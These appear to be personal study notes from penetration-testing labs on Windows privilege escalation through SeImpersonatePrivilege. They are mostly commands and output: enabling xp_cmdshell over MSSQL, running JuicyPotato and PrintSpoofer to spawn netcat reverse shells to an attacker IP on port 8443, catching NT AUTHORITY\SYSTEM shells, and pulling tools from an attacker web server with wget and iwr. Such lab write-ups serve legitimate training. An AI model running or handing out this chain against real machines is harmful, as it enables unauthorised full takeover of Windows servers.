# SeImpersonate and SeAssignPrimaryToken

**After we gain credentials to a user, we can transfer the hot potato exe to impersonate admin credentials.**

**Connecting with MSSQLClient.py**

```
doshim@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-authImpacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
```

**Enable xp_cmdshell**

```
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install
```

**Confirming Access**

```
SQL> xp_cmdshell whoami

output

--------------------------------------------------------------------------------

nt service\mssql$sqlexpress01
```

**Checking Account Privileges**

```
SQL> xp_cmdshell whoami /priv

output

--------------------------------------------------------------------------------

PRIVILEGES INFORMATION

----------------------
Privilege Name                Description                               State

============================= ========================================= ========

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

## **Escalating Privileges Using JuicyPotato**

**running on xp_cmdshell**

```
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *

output

--------------------------------------------------------------------------------

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375

[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
[+] calling 0x000000000088ce08
```

**catching system shell on netcat**

```
doshim@htb[/htb]$ sudo nc -lnvp 8443listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system
```

## Escalating priveleges using **PrintSpoofer and RoguePotato**

download the 64-bit version of this tool, and
serve it with a Python3 web server.

```
kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
...
2022-07-07 03:48:45 (16.6 MB/s) - ‘PrintSpoofer64.exe’ saved [27136/27136]

kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

> Listing 82 - Downloading PrintSpoofer64.exe and serve it with a Python3 web server
> 

In the terminal tab with the active bind shell, we'll start a
PowerShell session and use **iwr** to download **PrintSpoofer64.exe**
from our Kali machine.

```
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\dave> iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe

```

> Listing 83 - Downloading PrintSpoofer64.exe to CLIENTWK220
> 

To obtain an interactive PowerShell session in the context of
*NT AUTHORITY\SYSTEM* with *PrintSpoofer64.exe*, we'll enter
**powershell.exe** as argument for **-c** to specify the command we
want to execute and **-i** to interact with the process in the current
command prompt.

```
PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
.\PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
nt authority\system

```

> Listing 84 - Using the PrintSpoofer tool to get an interactive PowerShell session in the context of NT AUTHORITY\SYSTEM.
> 

Listing 84 shows that we successfully
performed the privilege escalation attack using *PrintSpoofer*,
leading us to an interactive PowerShell session in the context of the
user account *NT AUTHORITY\SYSTEM*. Excellent!

**running printspoofer using xm_cmdshell**

wget [https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe](https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe)

```
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

output

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```

**running netcat**

```
doshim@htb[/htb]$ nc -lnvp 8443listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
nt authority\system
```